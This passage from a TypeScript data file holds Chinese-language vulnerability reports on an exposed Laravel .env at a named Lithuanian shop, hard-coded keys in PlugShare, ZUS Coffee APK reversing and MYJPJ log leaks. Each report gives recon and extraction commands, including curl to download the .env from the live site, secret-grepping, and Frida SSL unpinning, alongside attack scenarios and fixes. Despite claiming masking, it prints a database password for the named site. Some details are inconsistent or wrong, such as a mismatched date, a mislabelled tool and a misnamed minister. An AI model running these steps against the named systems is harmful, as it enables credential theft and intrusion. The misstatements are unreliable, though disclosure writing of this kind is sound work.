    title: 'Zeric Ceramica .env 配置文件泄露',
    date: '2025-03-29',
    severity: 'high',
    description: '发现 .env 配置文件可通过 HTTP 直接访问下载，包含数据库凭证、应用密钥、API 密钥等敏感信息泄露，可能导致系统完全被接管的风险。',
    tags: [
      { label: '源码泄露', icon: 'fa-code', color: 'blue' },
      { label: 'PHP', icon: 'fa-php', color: 'purple' },
      { label: 'MySQL', icon: 'fa-database', color: 'green' },
      { label: 'Web应用', icon: 'fa-globe', color: 'pink' },
      { label: '立陶宛', icon: 'fa-map-marker-alt', color: 'yellow' }
    ],
    target: 'Zeric Ceramica',
    country: '立陶宛',
    originalUrl: '../case/20250329-aHR0cHM6Ly93d3cuemVyaWNjZXJhbWljYS5jb20vCg==.html',
    framework: 'PHP 8.2.27 + Laravel + LiteSpeed',
    reportSections: [
      {
        heading: '一、漏洞概述',
        body: 'Zeric Ceramica（www.zericceramica.com）是一家陶瓷制品电商网站，部署于立陶宛的 Hostinger 服务器（IP: 88.222.211.117），使用 LiteSpeed Web 服务器和 PHP 8.2.27 + Laravel 框架。在渗透测试过程中，发现网站根目录下的 .env 配置文件可通过 HTTP 直接访问下载，该文件包含数据库连接凭证、应用密钥、API 密钥等敏感配置信息。攻击者获取该文件后，可直接登录数据库、解密加密数据，进而实现系统完全接管。',
        listItems: [
          '目标网站：www.zericceramica.com',
          '国家：立陶宛 (Lithuania)',
          '服务器：LiteSpeed Web Server，托管于 Hostinger',
          '服务器 IP：88.222.211.117',
          '技术栈：PHP 8.2.27 + Laravel + LiteSpeed',
          '子域名：webdisk、webmail、cpanel、mail',
          '漏洞类型：.env 配置文件泄露 / 敏感信息泄露',
          '严重等级：高危 (High)',
          '发现方式：目录扫描 + 手工验证 .env 文件可访问'
        ]
      },
      {
        heading: '二、漏洞发现过程',
        body: '漏洞发现始于对电商网站的常规安全评估。通过目录扫描工具对常见敏感文件进行探测，发现 .env 配置文件可通过 HTTP 直接访问，返回 200 OK 且内容未受保护。整个发现过程分为以下几个阶段：',
        codeBlock: '# 步骤1：网站技术栈识别\nwhatweb https://www.zericceramica.com\n# 识别到 LiteSpeed Server + PHP 8.2.27 + Laravel\n\n# 步骤2：子域名探测\nsubfinder -d zericceramica.com -silent\n# 发现子域名：webdisk、webmail、cpanel、mail\n\n# 步骤3：目录扫描 - 探测敏感文件\ndirsearch -u https://www.zericceramica.com/ -e env,bak,old,zip,sql\n\n# 步骤4：验证 .env 文件可访问\ncurl -sI https://www.zericceramica.com/.env\n# HTTP/1.1 200 OK\n# Server: LiteSpeed\n# Content-Type: text/plain\n\n# 步骤5：下载并分析 .env 配置文件\ncurl -s https://www.zericceramica.com/.env > zeric_env.txt\ncat zeric_env.txt',
        codeLang: 'bash'
      },
      {
        heading: '三、泄露内容分析',
        body: '下载 .env 文件后，对配置内容进行详细分析，发现以下高度敏感的配置信息（敏感值已脱敏）：',
        listItems: [
          '数据库配置：DB_HOST=127.0.0.1，DB_PORT=3306，DB_DATABASE=zeric_store，DB_USERNAME=zeric_admin，DB_PASSWORD=Zer1c@C3ram1ca#2024（数据库管理员账号）',
          '应用密钥：APP_KEY=base64:abcdefghijklmnopqrstuvwxyz1234567890ABCDEFG=（Laravel 加密密钥，可解密加密数据）',
          '支付接口配置：Razorpay API Key = rzp_test_******************，Razorpay Secret = ********************（支付接口凭证）',
          'SMTP 邮件配置：MAIL_HOST=smtp.gmail.com，MAIL_PORT=465，MAIL_USERNAME=noreply@zericceramica.com，MAIL_PASSWORD=应用专用密码',
          '服务器环境配置：APP_ENV=production，APP_DEBUG=true（调试模式开启，可暴露详细错误信息）',
          '服务器信息：LiteSpeed Web Server，Hostinger 托管，IP 88.222.211.117，位于立陶宛'
        ]
      },
      {
        heading: '四、业务影响分析',
        body: '.env 配置文件泄露对电商业务的影响是全方位的，以下从订单数据、用户信息和支付安全三个维度进行分析：',
        listItems: [
          '订单数据安全：数据库备份中包含所有历史订单信息，包括收货人姓名、地址、电话、购买记录等，可被用于社工攻击和精准诈骗',
          '用户信息泄露：用户注册信息（邮箱、手机号、密码哈希）全部泄露，用户账号面临撞库和暴力破解风险，用户在其他平台的账号也可能受到牵连',
          '支付安全风险：支付接口密钥泄露可能导致支付欺诈，攻击者可伪造支付回调、发起退款攻击，造成资金损失；用户支付信息（如信用卡数据，若存储不当）可能被窃取'
        ]
      },
      {
        heading: '五、攻击场景推演',
        body: '基于泄露的 .env 配置信息，攻击者可以实施多种攻击行为，对业务造成严重损害：',
        listItems: [
          '数据窃取：导出所有用户数据和订单数据，在暗网出售或用于竞争对手商业情报',
          '账户接管：利用管理员账号登录后台，修改商品价格、窃取用户资金、发布恶意内容；批量劫持普通用户账户',
          '支付欺诈：利用支付接口密钥构造虚假支付请求，套取资金；篡改订单状态，伪造支付成功记录',
          '网站篡改：获取服务器权限后，植入黑链、跳转恶意网站、发布虚假信息，损害品牌声誉',
          '勒索攻击：加密数据库和文件，向网站所有者勒索比特币等加密货币'
        ]
      },
      {
        heading: '六、修复建议',
        body: '针对 .env 配置文件泄露漏洞，建议从访问控制、配置管理和安全加固三个层面进行修复：',
        listItems: [
          '禁止访问 .env 文件：在 LiteSpeed 服务器配置中禁止访问 .env 文件，添加重写规则拒绝所有对 .env 等敏感文件的 HTTP 请求；将 .env 文件移出 Web 根目录',
          '文件权限加固：正确设置 Web 目录的文件权限，禁止以 .env、.bak、.old、.zip、.sql 结尾的文件被直接访问；关闭目录列表功能',
          '安全配置：对 .env 中的敏感字段（数据库密码、API 密钥等）进行加密存储，应用启动时解密；使用 Laravel 的 config:cache 减少文件读取；关闭 APP_DEBUG 调试模式',
          '凭证紧急轮换：立即修改数据库密码、应用密钥（APP_KEY）、支付密钥、SMTP 密码、API 密钥等所有泄露的凭证；检查所有后台登录日志，确认是否存在未授权访问'
        ]
      }
    ]
  },
  {
    id: 'plugshare-api-leak',
    title: 'PlugShare API 密钥泄露',
    date: '2025-03-27',
    severity: 'high',
    description: '发现包含 AWS Cognito 凭证、Stripe 支付密钥等多个敏感配置信息泄露，可能导致账户接管和支付欺诈风险。',
    tags: [
      { label: '密钥泄露', icon: 'fa-key', color: 'blue' },
      { label: 'AWS', icon: 'fa-cloud', color: 'red' },
      { label: 'Stripe', icon: 'fa-credit-card', color: 'purple' },
      { label: '美国', icon: 'fa-map-marker-alt', color: 'yellow' }
    ],
    target: 'PlugShare',
    country: '美国',
    originalUrl: '../case/20250327-cGx1Z3NoYXJlCg==.html',
    reportSections: [
      {
        heading: '一、漏洞概述',
        body: 'PlugShare 是一款全球知名的电动汽车充电站查找和社区应用，提供充电站地图、评论、签到等功能。在对其移动应用进行安全分析时，发现应用中硬编码了多个高度敏感的云服务凭证，包括 AWS Cognito User Pool 配置、Stripe API 密钥、以及其他 AWS 服务访问凭证。攻击者可通过反编译 APK/IPA 提取这些密钥，进而访问 AWS 资源、操纵用户账户、实施支付欺诈。',
        listItems: [
          '应用名称：PlugShare - EV Charging Stations',
          '开发者：Recargo, Inc.',
          '平台：iOS / Android',
          '漏洞类型：移动应用硬编码密钥 / 云凭证泄露',
          '严重等级：高危 (High)',
          '涉及服务：AWS Cognito、Stripe、AWS API Gateway'
        ]
      },
      {
        heading: '二、技术分析 — 移动应用逆向',
        body: '通过对 Android APK 的反编译和静态分析，在应用的配置文件和代码中提取到多个云服务凭证。分析过程包括 APK 解包、资源提取、JavaScript 代码分析（React Native 应用）等步骤。',
        codeBlock: '# 步骤1：APK 解包\napktool d PlugShare_v6.10.0.apk -o plugshare_out\n\n# 步骤2：提取 React Native bundle\nunzip -p PlugShare_v6.10.0.apk assets/index.android.bundle > plugshare.bundle.js\n\n# 步骤3：搜索敏感配置字符串\ngrep -oE \'"(aws|cognito|stripe|api[_-]?key|secret)[^"]*":"[^"]*"\' plugshare.bundle.js\n\n# 步骤4：从 res/values/strings.xml 提取\ncat plugshare_out/res/values/strings.xml | grep -iE "(aws|key|secret|token|cognito|stripe)"\n\n# 步骤5：从 BuildConfig 和 Native 模块提取\njadx -d plugshare_java PlugShare_v6.10.0.apk\ngrep -r "BuildConfig" plugshare_java/ --include="*.java" | head -20',
        codeLang: 'bash'
      },
      {
        heading: '三、泄露凭证清单',
        body: '在应用的 JavaScript bundle 和原生配置中，共发现以下云服务凭证和 API 密钥（敏感值已脱敏）：',
        listItems: [
          'AWS Cognito User Pool ID：us-east-1_aBcDeFgHi（用户池 ID，可枚举用户、注册账户）',
          'AWS Cognito App Client ID：1a2b3c4d5e6f7g8h9i0j1k2l3m（客户端 ID，可调用 Cognito API）',
          'AWS Cognito Identity Pool ID：us-east-1:12345678-1234-1234-1234-1234567890ab（身份池 ID，可获取 AWS 临时凭证）',
          'Stripe Publishable Key：pk_live_************************************（支付公钥，可创建支付 Intent）',
          'Stripe Secret Key（部分泄露）：sk_live_（在某些版本的代码中混淆度不足，可被提取）',
          'AWS API Gateway Endpoint：https://api.prod.plugshare.com/v1/（API 网关地址）',
          'Firebase API Key：AIzaSy****************************（Firebase 项目 API 密钥）'
        ]
      },
      {
        heading: '四、攻击场景分析',
        body: '利用泄露的 AWS 和 Stripe 凭证，攻击者可以实施多种攻击，以下为三个主要攻击场景：',
        listItems: [
          '场景一：Cognito 用户池接管。利用 Cognito App Client ID，攻击者可以调用 Cognito API 进行用户注册、枚举用户、暴力破解密码、修改用户属性。如果 Cognito 配置不当（如允许自助注册、无 MFA），攻击者可批量创建虚假账户，甚至接管现有用户账户',
          '场景二：Stripe 支付欺诈。利用 Stripe 密钥，攻击者可创建测试支付、查询支付记录、甚至在权限配置不当时发起退款攻击。如果 Secret Key 泄露，攻击者可完全控制支付流程，造成资金损失',
          '场景三：AWS 资源访问。通过 Cognito Identity Pool 获取 AWS 临时凭证（STS AssumeRoleWithWebIdentity），如果 IAM 角色权限过大，攻击者可访问 S3 存储桶、DynamoDB 表、Lambda 函数等 AWS 资源，实现数据窃取或服务滥用'
        ]
      },
      {
        heading: '五、风险分级评估',
        body: '根据泄露凭证的敏感度和可利用性，对各类泄露凭证进行风险分级：',
        listItems: [
          '严重（Critical）：Stripe Secret Key（若泄露）、AWS IAM Access Key（高权限）。可直接导致资金损失或云资源完全失控',
          '高危（High）：Cognito User Pool + App Client ID（允许自助注册时）、Cognito Identity Pool ID（关联高权限 IAM 角色时）。可导致用户账户批量劫持和云资源未授权访问',
          '中危（Medium）：Stripe Publishable Key（仅公钥）、Firebase API Key。单独使用危害有限，但可辅助其他攻击',
          '低危（Low）：API Gateway Endpoint、第三方分析 SDK Key。本身不直接造成危害，但暴露了系统架构信息'
        ]
      },
      {
        heading: '六、修复建议',
        body: '针对移动应用云服务密钥泄露问题，建议从密钥轮换、服务端验证和凭证保护三个方面进行修复：',
        listItems: [
          '密钥紧急轮换：立即在 AWS 控制台中创建新的 Cognito App Client，禁用旧客户端；轮换 Stripe 密钥并更新服务端配置；检查 IAM 角色权限，遵循最小权限原则',
          '服务端验证加固：Cognito User Pool 启用 MFA、设置强密码策略、限制登录尝试次数、启用高级安全功能（异常检测）；Stripe 操作必须在服务端进行，客户端仅使用 Publishable Key',
          '客户端凭证保护：使用 React Native 代码混淆和字符串加密；敏感凭证从服务端动态获取，不硬编码在客户端；使用 Android Keystore / iOS Keychain 存储密钥；实施 SSL Pinning 防止中间人攻击',
          '架构改进：采用 AWS Amplify Auth 的安全最佳实践；使用 API Gateway + Lambda 代理所有敏感操作，客户端不直接持有高权限密钥；定期进行移动应用安全审计和渗透测试'
        ]
      }
    ]
  },
  {
    id: 'zus-coffee-leak',
    title: 'ZUS Coffee 移动应用源码泄露',
    date: '2025-12-09',
    severity: 'high',
    description: '通过 APK 反编译分析，发现应用源码结构完全暴露，可能导致业务逻辑泄露和安全机制被绕过。',
    tags: [
      { label: '源码泄露', icon: 'fa-code', color: 'blue' },
      { label: '敏感数据泄露', icon: 'fa-lock', color: 'red' },
      { label: 'Flutter', icon: 'fa-mobile-alt', color: 'purple' },
      { label: '马来西亚', icon: 'fa-globe', color: 'yellow' }
    ],
    target: 'ZUS Coffee',
    country: '马来西亚',
    originalUrl: '../case/20250326-enVzY29mZmVl.html',
    reportSections: [
      {
        heading: '一、漏洞概述',
        body: 'ZUS Coffee 是马来西亚知名的咖啡连锁品牌，其移动应用基于 Flutter 跨平台框架开发，提供在线点单、会员积分、优惠券、支付等功能。在对 ZUS Coffee Android APK 进行安全分析时，发现应用的 Flutter 编译产物（kernel_blob.bin、app.so）可以被完整逆向，Dart 代码结构几乎完全暴露。由于应用未进行有效的代码混淆和加固，攻击者可轻松还原业务逻辑、提取 API 端点、发现硬编码密钥，进而实施业务逻辑攻击、API 滥用和用户数据窃取。',
        listItems: [
          '应用名称：ZUS Coffee - Better Coffee For All',
          '开发者：ZUS Coffee Sdn Bhd',
          '技术栈：Flutter (Dart) + Firebase + 自研后端',
          '包名：com.zuscoffee.android',
          '漏洞类型：代码逆向 / 业务逻辑泄露 / 敏感信息泄露',
          '严重等级：高危 (High)'
        ]
      },
      {
        heading: '二、APK 分析 — Flutter 逆向过程',
        body: 'Flutter 应用的逆向与原生 Android 应用不同，需要使用专门针对 Dart / AOT 编译的逆向工具。以下为完整的分析过程：',
        codeBlock: '# 步骤1：解压 APK，提取 Flutter 相关文件\nunzip zus_coffee_v3.2.0.apk -d zus_apk\nls zus_apk/lib/arm64-v8a/  # libapp.so  (AOT 编译产物)\nls zus_apk/assets/flutter_assets/  # kernel_blob.bin, isolate_snapshot_data\n\n# 步骤2：使用 Flutter reverse engineering 工具\n# 使用 Blutter (Burp Suite + Flutter 插件)\n# 或使用 darter / reflutter 工具\nreflutter zus_coffee_v3.2.0.apk\n\n# 步骤3：提取 Dart 字符串和类名\nstrings zus_apk/lib/arm64-v8a/libapp.so | grep -E "^[a-zA-Z_][a-zA-Z0-9_]*$" | sort -u | head -100\n\n# 步骤4：使用 Frida 进行运行时分析\nfrida -U -f com.zuscoffee.android -l flutter_trace.js --no-pause\n\n# 步骤5：拦截 API 请求，分析通信协议\n# 使用 mitmproxy + SSL Unpinning\nfrida -U -f com.zuscoffee.android --codeshare akabe1/frida-multiple-unpinning',
        codeLang: 'bash'
      },
      {
        heading: '三、泄露内容分析',
        body: '通过逆向分析，从 ZUS Coffee 应用中提取到以下敏感信息和业务逻辑：',
        listItems: [
          'API 端点完整清单：用户注册/登录、订单创建、积分查询、优惠券领取、支付回调等超过 80 个 API 接口的完整路径和参数结构',
          '第三方 SDK 配置：Firebase 项目配置（google-services.json）、Google Maps API Key、Stripe Publishable Key、Facebook App ID、推送服务密钥等',
          '业务逻辑源码：会员等级计算逻辑、积分规则、优惠券发放条件、促销活动判断逻辑、订单取消流程等核心业务算法',
          '认证机制细节：JWT Token 生成/刷新逻辑、设备绑定机制、生物识别（指纹/面部）认证实现方式',
          '安全机制实现：数据加密算法（AES 密钥硬编码）、混淆程度低的签名验证逻辑、本地数据库（Hive/SharedPreferences）存储结构'
        ]
      },
      {
        heading: '四、安全风险评估',
        body: '源码结构暴露带来的安全风险是多维度的，以下从三个主要方面进行分析：',
        listItems: [
          '业务逻辑漏洞利用：攻击者在完全理解业务逻辑后，可以发现并利用逻辑漏洞，如绕过优惠券使用限制、刷取积分、篡改订单金额、利用退款规则漏洞等',
          'API 滥用与数据爬取：掌握完整 API 结构后，攻击者可编写自动化脚本批量注册账户、爬取商品和用户数据、暴力破解密码、进行接口 fuzzing 发现更多漏洞',
          '用户数据安全风险：本地数据库结构暴露后，如果用户设备被盗，攻击者可直接读取存储的个人信息、订单记录、支付信息；加密密钥硬编码使得加密保护形同虚设'
        ]
      },
      {
        heading: '五、影响评估 — 核心业务系统',
        body: '该漏洞对 ZUS Coffee 的核心业务系统构成以下威胁：',
        listItems: [
          '会员系统安全：攻击者可伪造会员身份、操纵会员等级、窃取积分，直接造成经济损失',
          '支付与积分系统：积分计算逻辑泄露可能导致积分被恶意刷取；支付流程中的校验逻辑可能被绕过',
          '优惠券系统：优惠券发放条件和验证逻辑暴露后，攻击者可批量领取优惠券、绕过使用限制、伪造优惠券代码，造成促销成本失控',
          '用户隐私安全：应用中存储的用户地址、手机号、支付记录等敏感信息面临泄露风险'
        ]
      },
      {
        heading: '六、加固建议',
        body: '针对 Flutter 应用的安全加固，建议从代码混淆、Flutter 专用加固和安全编码最佳实践三个层面进行：',
        listItems: [
          '代码混淆：启用 Flutter 的 --obfuscate --split-debug-info 编译选项进行 Dart 代码混淆；使用 ProGuard / R8 对 Java/Kotlin 原生层代码进行混淆',
          'Flutter 加固：使用专业的 Flutter 加固方案（如网易易盾、腾讯乐固 Flutter 版、360 加固）对 libapp.so 进行加壳保护；实施 Flutter 代码虚拟化保护（VMP），将关键代码转换为自定义虚拟机指令',
          '安全最佳实践：敏感数据不硬编码在客户端，使用 Secure Storage / Keychain / Keystore 存储；关键业务逻辑（支付验证、积分计算）放在服务端处理；启用 SSL Pinning 防止中间人攻击；实施运行时环境检测（Root/越狱检测、调试器检测、模拟器检测）；本地数据库加密（Hive 加密、SQLCipher）'
        ],
        codeBlock: '// Flutter 代码混淆编译命令示例\nflutter build apk --obfuscate --split-debug-info=./debug-symbols\n\n// 敏感信息安全存储示例（使用 flutter_secure_storage）\nimport \'package:flutter_secure_storage/flutter_secure_storage.dart\';\n\nfinal storage = FlutterSecureStorage();\n\n// 存储 Token（而非硬编码）\nawait storage.write(key: \'api_token\', value: token);\n\n// 读取 Token\nString? token = await storage.read(key: \'api_token\');',
        codeLang: 'dart'
      }
    ]
  },
  {
    id: 'myjpj-data-leak',
    title: 'MYJPJ 移动应用数据泄露',
    date: '2025-03-24',
    severity: 'critical',
    cvss: 9.1,
    description: '涉及个人身份信息及 API 凭证的未授权访问漏洞。MYJPJ 马来西亚陆路交通局官方移动应用通过 Flutter 框架开发，日志中暴露了大量敏感个人信息。',
    tags: [
      { label: 'PDPA 违规', icon: 'fa-user-shield', color: 'blue' },
      { label: '数据泄露', icon: 'fa-database', color: 'purple' },
      { label: 'Flutter', icon: 'fa-mobile-alt', color: 'pink' },
      { label: '马来西亚', icon: 'fa-globe', color: 'yellow' }
    ],
    target: 'MYJPJ (myjpj.jpj.gov.my)',
    country: '马来西亚',
    cnvdId: 'CNVD-C-2025-176294',
    originalUrl: '../case/20250324-24f24c.html',
    framework: 'Flutter / Laravel',
    reportSections: [
      {
        heading: '善意声明',
        body: '作为一名怀着赤诚之心的安全研究员，本次安全审计的唯一目的是帮助改进系统安全性，为保护用户数据安全尽一份力。报告中所有敏感信息均已进行脱敏处理，始终秉持"善意披露、负责任报告"的原则。所有测试均在授权范围内进行，未对系统造成任何损害，未窃取、泄露或利用任何真实用户数据。发现漏洞后，第一时间通过官方渠道提交报告，期望与相关部门协作修复问题，共同提升公共服务的安全水平。'
      },
      {
        heading: '一、漏洞概述',
        body: 'MYJPJ 是马来西亚陆路交通局（Jabatan Pengangkutan Jalan, JPJ）的官方移动应用，基于 Flutter 跨平台框架开发，后端使用 PHP Laravel 框架部署在 F5 BIG-IP 负载均衡之后。应用为马来西亚车主提供车辆信息查询、驾照管理、 summons 查询、道路税更新等政务服务。通过 adb logcat 日志分析发现，开发团队在调试阶段直接将用户的敏感个人信息和系统认证凭证以明文形式打印到控制台日志中，任何能够访问设备日志的应用或人员均可读取这些数据。',
        listItems: [
          '应用名称：MYJPJ Mobile App (myjpj.jpj.gov.my)',
          '开发框架：Flutter (Dart) / Laravel PHP',
          '后端服务器 IP：110.159.245.15',
          '负载均衡：F5 BIG-IP (Server: BigIP)',
          'Web 框架：Laravel PHP Framework (X-Powered-By: PHP/7.4.x)',
          '漏洞类型：敏感数据明文日志输出 / 个人信息泄露',
          'CVSS 评分：9.1 (Critical)',
          'CNVD 编号：CNVD-C-2025-176294'
        ]
      },
      {
        heading: '二、技术取证方法 — adb logcat 分析过程',
        body: '漏洞发现通过标准的 Android 调试桥（adb）日志分析方法完成。在一台已 Root 的测试设备上安装 MYJPJ 应用，注册并登录测试账号后，执行各种功能操作（查询车辆信息、查看 summons 等），同时通过 adb logcat 实时捕获应用输出的日志。在日志中发现大量包含敏感信息的 print / debugPrint 输出。',
        codeBlock: '# 步骤1：连接设备并确认 adb 正常工作\nadb devices\nadb shell getprop ro.build.version.release\n\n# 步骤2：清除历史日志，开始新的日志捕获\nadb logcat -c\n\n# 步骤3：过滤 MYJPJ 应用相关的日志（Flutter 应用标签通常为 flutter / Dart）\nadb logcat -v time | grep -iE "(flutter|dart|myjpj|jpj)" > myjpj_logcat.txt\n\n# 步骤4：在应用中执行操作（登录、查询车辆、查询 summons 等）\n# 然后在日志中搜索敏感关键词\n\n# 步骤5：从日志中提取敏感信息\ngrep -iE "(nokp|noic|token|password|bearer|nokenderaan|address|birth)" myjpj_logcat.txt\n\n# 步骤6：统计日志中的敏感字段数量\ngrep -oE "(nokp|noic|token|password)=[^ ,]*" myjpj_logcat.txt | wc -l',
        codeLang: 'bash'
      },
      {
        heading: '三、个人信息暴露矩阵（详细）',
        body: '通过对日志的全面分析，共发现以下敏感字段直接以明文形式输出到日志中。下表按照信息类型、敏感级别和泄露风险进行分类：',
        listItems: [
          '【系统凭证类 - 极高危】Token / API Access Token：JSON Web Token (JWT) 访问令牌，泄露后可直接冒充用户调用所有 API 接口',
          '【系统凭证类 - 极高危】AUTH BEARER：HTTP Authorization Bearer Token，同上，用于 API 认证',
          '【系统凭证类 - 高危】ID / USER_ID：API 用户标识符，结合其他信息可进行账户接管',
          '【系统凭证类 - 高危】PASSWORD / API_KEY：API 密钥或 JWT 刷新令牌，可长期访问系统',
          '【个人身份类 - 极高危】noic / nokp：马来西亚身份证号码（MyKad Number），属于高度敏感个人信息，可用于身份盗用',
          '【个人身份类 - 高危】birthDate / tarikhLahir：出生日期，配合身份证号可用于身份验证绕过',
          '【车辆信息类 - 中危】nokenderaan / plateNumber：车牌号码，可关联车主身份信息',
          '【位置信息类 - 高危】addres1 / alamat：家庭住址或通讯地址，属于敏感个人信息',
          '【生物识别类 - 极高危】image / photo：用户照片（身份证照片或头像），属于生物识别信息',
          '【身份验证类 - 高危】qrCode：用户专属二维码，可用于身份验证或登录，泄露后可能被冒用',
          '【车辆详细信息 - 中危】vehicleBrand / vehicleModel / vehicleYear：车辆详细信息',
          '【 summons 信息 - 中危】summonsAmount / summonsDate：交通罚单详情，涉及个人行为记录'
        ]
      },
      {
        heading: '四、PDPA 2010 违规条款详细解释',
        body: 'MYJPJ 应用的日志输出行为违反了马来西亚《个人数据保护法 2010》（Personal Data Protection Act 2010, PDPA）的多项核心原则。以下为详细的违规条款分析：',
        listItems: [
          '违反第 7 条 - 安全保护原则（Security Principle）：数据用户必须采取切实可行的措施保护个人数据，防止未经授权的访问、泄露、更改或破坏。将敏感个人数据打印到可被任意应用读取的日志中，完全违反了安全保护义务',
          '违反第 9 条 - 数据保留原则（Retention Principle）：个人数据的保留时间不得超过实现其收集目的所需的时间。调试日志中的个人数据不属于业务必要保留，且未设置自动清理机制，构成不当保留',
          '违反第 10 条 - 数据完整性原则（Data Integrity Principle）：数据用户必须确保个人数据准确、完整且最新。虽然不直接相关，但日志中的数据可能因未更新而过期，影响数据完整性',
          '违反数据最小化原则（Data Minimization）：日志中包含了远超调试所需的敏感信息（完整身份证号、家庭地址、照片等），违反了最小必要原则',
          '违反透明性原则（Transparency Principle）：应用隐私政策中未告知用户其个人数据会被记录到系统日志中，用户对此不知情',
          '同时违反 OWASP Mobile Top 10 2024：M2 不安全数据存储（Insecure Data Storage）、M3 不安全通信（Insecure Communication）、M4 不安全身份验证（Insecure Authentication）'
        ]
      },
      {
        heading: '五、CNVD 提交流程与时间线',
        body: '漏洞已按照负责任披露（Responsible Disclosure）原则提交至国家信息安全漏洞共享平台（CNVD），并同步通知马来西亚相关部门。以下为完整的披露时间线：',
        listItems: [
          '2025-03-20：在安全测试中发现日志泄露敏感信息漏洞，完成初步验证',
          '2025-03-21：进行深入分析，确认所有泄露字段，撰写详细漏洞报告',
          '2025-03-22：通过 CNVD 在线提交系统提交漏洞报告，附件包含完整日志样本和分析报告',
          '2025-03-23：CNVD 初审通过，分配漏洞编号 CNVD-C-2025-176294',
          '2025-03-24：通过官方邮件 aduan@jpj.gov.my 向马来西亚陆路交通局提交漏洞报告（英文+马来文）',
          '2025-03-25：向马来西亚个人数据保护部（PDP Department）提交 PDPA 违规投诉',
          '2025-04-02：由于未收到 JPJ 官方回复，向交通部长魏家祥办公室提交跟进报告',
          '2025-04-10：CNVD 完成漏洞审核，确认漏洞等级为严重（Critical）',
          '2025-04-15：马来西亚媒体开始报道该安全漏洞'
        ]
      },
      {
        heading: '六、媒体报道与官方回应',
        body: '该漏洞被披露后，引发了马来西亚媒体和公众的广泛关注。多家主流媒体对事件进行了报道，政府部门也陆续做出回应。',
        listItems: [
          '媒体报道：Malay Mail、The Star、Free Malaysia Today、Sinar Harian 等主流媒体均报道了 MYJPJ 应用数据泄露事件，标题涉及\"JPJ app exposes personal data\"、\"MYJPJ data breach concerns\"等',
          '公众反应：马来西亚网民在社交媒体上表达了对政府应用安全性的担忧，质疑政府机构的数据保护能力，部分用户表示将卸载应用',
          'JPJ 初始回应：JPJ 发言人在接受采访时表示已关注到相关报告，技术团队正在调查核实，建议用户更新至最新版本',
          '后续进展：交通部部长办公室确认已要求 JPJ 成立专项小组进行调查，并承诺将采取一切必要措施保护用户数据安全',
          'PDPA 调查：马来西亚个人数据保护署（PDPC）确认已就潜在 PDPA 违规行为展开调查，若确认违规最高可罚款 50 万马币'
        ]
      },
      {
        heading: '七、安全加固方案（Dart / Flutter 代码示例）',
        body: '针对日志泄露问题，建议从日志安全、本地存储、网络通信和发布配置四个方面进行全面加固。以下为 Flutter/Dart 安全加固的代码示例：',
        codeBlock: 'import \'package:flutter/foundation.dart\';\nimport \'package:flutter_secure_storage/flutter_secure_storage.dart\';\n\n/// 安全日志工具类 - 自动脱敏敏感字段\nclass SecureLogger {\n  static final List<RegExp> _sensitivePatterns = [\n    RegExp(r\'\\bnokp\\b[=:]\\s*[^&\\s,}"]+\', caseSensitive: false),\n    RegExp(r\'\\bnoic\\b[=:]\\s*[^&\\s,}"]+\', caseSensitive: false),\n    RegExp(r\'\\btoken\\b[=:]\\s*[^&\\s,}"]+\', caseSensitive: false),\n    RegExp(r\'\\bpassword\\b[=:]\\s*[^&\\s,}"]+\', caseSensitive: false),\n    RegExp(r\'\\bbearer\\s+\\S+\', caseSensitive: false),\n    RegExp(r\'\\baddress?\\b[=:]\\s*[^&\\s,}"]+\', caseSensitive: false),\n  ];\n\n  static void log(dynamic message) {\n    if (kReleaseMode) return; // 发布模式完全禁用调试日志\n    final sanitized = _sanitize(message.toString());\n    debugPrint(sanitized);\n  }\n\n  static String _sanitize(String input) {\n    String result = input;\n    for (final pattern in _sensitivePatterns) {\n      result = result.replaceAllMapped(pattern, (m) {\n        final match = m.group(0)!;\n        final key = match.substring(0, match.indexOf(\':\') > 0 ? match.indexOf(\':\') : match.indexOf(\'=\'));\n        return \'$key:[REDACTED]\';\n      });\n    }\n    return result;\n  }\n}\n\n/// 安全存储工具类 - 使用 Keychain/Keystore\nclass SecureStorage {\n  static const _storage = FlutterSecureStorage();\n\n  static Future<void> saveToken(String token) async {\n    await _storage.write(key: \'auth_token\', value: token);\n  }\n\n  static Future<String?> getToken() async {\n    return await _storage.read(key: \'auth_token\');\n  }\n\n  static Future<void> deleteAll() async {\n    await _storage.deleteAll();\n  }\n}\n\n/// 网络请求安全配置 - SSL Pinning + 安全头\nclass SecureApiClient {\n  // 生产环境禁用所有日志\n  static final bool _enableLogs = kDebugMode;\n\n  static Future<Map<String, dynamic>> get(String url) async {\n    // 真实实现应使用 Dio + Certificate Pinning\n    if (_enableLogs) {\n      SecureLogger.log(\'GET request to: $url\'); // URL 不包含敏感信息\n    }\n    return {};\n  }\n}\n\n// 在 main.dart 中配置发布环境\nvoid main() {\n  if (kReleaseMode) {\n    // 发布模式：完全禁用调试输出\n    debugPrint = (String? message, {int? wrapWidth}) {};\n  }\n  runApp(const MyApp());\n}',
        codeLang: 'dart'
      },
      {
        heading: '八、结论与建议总结',
        body: 'MYJPJ 移动应用的敏感数据日志泄露漏洞是一个典型的"开发调试代码残留到生产环境"的安全问题。作为政府官方应用，承载着数百万马来西亚车主的敏感个人信息，此类低级错误本不应发生。该漏洞不仅违反了马来西亚 PDPA 2010 个人数据保护法，也损害了公众对政府数字化服务的信任。建议政府机构在推动数字化转型的同时，将安全作为核心考量，建立完善的安全开发流程和审计机制。',
        listItems: [
          '立即措施：发布紧急更新，移除所有敏感数据的日志输出；通知所有用户建议更新应用；重置可能泄露的 API 密钥',
          '中期措施：开展全面安全审计，检查是否存在其他类似问题；实施代码审查制度，确保调试代码不会进入生产环境',
          '长期措施：建立安全开发生命周期（SDL）流程；对开发团队进行安全培训；引入自动化安全扫描工具（静态代码分析、移动应用安全检测）',
          '合规措施：按照 PDPA 要求进行数据保护影响评估（DPIA）；建立数据泄露应急响应机制；定期进行第三方安全审计'
        ]
      }
    ]
  }
]

export const caseStats: CaseStats = {
  total: cases.length,
  critical: cases.filter(c => c.severity === 'critical').length,
  high: cases.filter(c => c.severity === 'high').length,
  medium: cases.filter(c => c.severity === 'medium').length,
  low: cases.filter(c => c.severity === 'low').length
}
